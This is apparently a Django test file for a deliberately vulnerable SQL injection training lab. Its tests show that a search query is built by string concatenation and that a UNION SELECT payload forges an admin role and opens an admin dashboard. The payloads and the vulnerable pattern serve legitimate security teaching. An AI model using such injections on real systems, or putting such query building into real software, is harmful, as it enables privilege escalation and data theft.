"""
Tests for the sqli-raw lab server.

INTENTIONALLY VULNERABLE LAB SERVER (CWE-89). See README.md.

QueriesUnitTests requires no database at all - it just asserts the
vulnerable string-building behavior of build_search_query(), so it
documents/proves the bug even in environments without MySQL configured.

SqliExploitTests is a normal Django TestCase (needs a real MySQL database
to run, per DATABASES in config/settings.py) that proves the UNION-based
injection actually forges an admin role and unlocks /api/admin/dashboard.
"""
from django.contrib.auth.models import User
from django.test import Client, SimpleTestCase, TestCase

from .models import UserProfile
from .queries import build_search_query


class QueriesUnitTests(SimpleTestCase):
    """Pure string-building assertions - no database access, so these run
    even without MySQL installed/configured."""

    databases = set()

    def test_payload_appears_verbatim_in_generated_sql(self):
        payload = "admin' -- "
        sql = build_search_query(payload)
        self.assertIn(payload, sql)

    def test_ordinary_username_is_wrapped_in_single_quotes(self):
        sql = build_search_query("alice")
        self.assertIn("'alice'", sql)

    def test_union_payload_appears_verbatim(self):
        payload = (
            "nobody' UNION SELECT au.id, au.username, 'admin' "
            "FROM auth_user au WHERE au.username='moderator1' -- "
        )
        sql = build_search_query(payload)
        self.assertIn(payload, sql)
        # The query is built by naive string concatenation, so the
        # attacker-supplied UNION keyword ends up directly in the SQL text
        # rather than being treated as a literal value.
        self.assertIn("UNION SELECT", sql)


class SqliExploitTests(TestCase):
    """Requires a live MySQL database (see config/settings.py DATABASES).
    Not runnable in this sandbox - see README.md."""

    def setUp(self):
        # The 0002_seed_users data migration already creates user1 /
        # moderator1 / admin1, so use get_or_create here to stay idempotent
        # rather than colliding with the seeded rows.
        self.user1, _ = User.objects.get_or_create(username="user1")
        self.user1.set_password("user1_lab_pw")
        self.user1.save()
        UserProfile.objects.get_or_create(
            user=self.user1, defaults={"role": UserProfile.ROLE_USER}
        )

        self.moderator1, _ = User.objects.get_or_create(username="moderator1")
        self.moderator1.set_password("moderator1_lab_pw")
        self.moderator1.save()
        UserProfile.objects.get_or_create(
            user=self.moderator1, defaults={"role": UserProfile.ROLE_MODERATOR}
        )

        self.client = Client()

    def test_normal_search_returns_real_role(self):
        response = self.client.get("/search", {"username": "user1"})
        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertTrue(body["found"])
        self.assertEqual(body["user"]["role"], UserProfile.ROLE_USER)

    def test_admin_dashboard_forbidden_without_admin_role(self):
        self.client.get("/search", {"username": "user1"})
        response = self.client.get("/api/admin/dashboard")
        self.assertEqual(response.status_code, 403)

    def test_union_injection_forges_admin_role_and_unlocks_dashboard(self):
        # This payload never supplies a valid username; instead it closes
        # the WHERE clause's string literal and UNION SELECTs a forged
        # role='admin' row for the real "moderator1" account.
        payload = (
            "nobody' UNION SELECT au.id, au.username, 'admin' "
            "FROM auth_user au WHERE au.username='moderator1' -- "
        )

        response = self.client.get("/search", {"username": payload})
        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertTrue(body["found"])
        self.assertEqual(body["user"]["username"], "moderator1")
        # The real moderator1 profile has role='moderator'; the injection
        # forged role='admin' into the row this view trusts.
        self.assertEqual(body["user"]["role"], UserProfile.ROLE_ADMIN)

        # The forged admin role is now trusted by the session, so a
        # follow-up request to the admin-only endpoint succeeds despite the
        # caller never having authenticated as an actual admin.
        dashboard_response = self.client.get("/api/admin/dashboard")
        self.assertEqual(dashboard_response.status_code, 200)
        dashboard_body = dashboard_response.json()
        self.assertIn("user1", dashboard_body["all_usernames"])
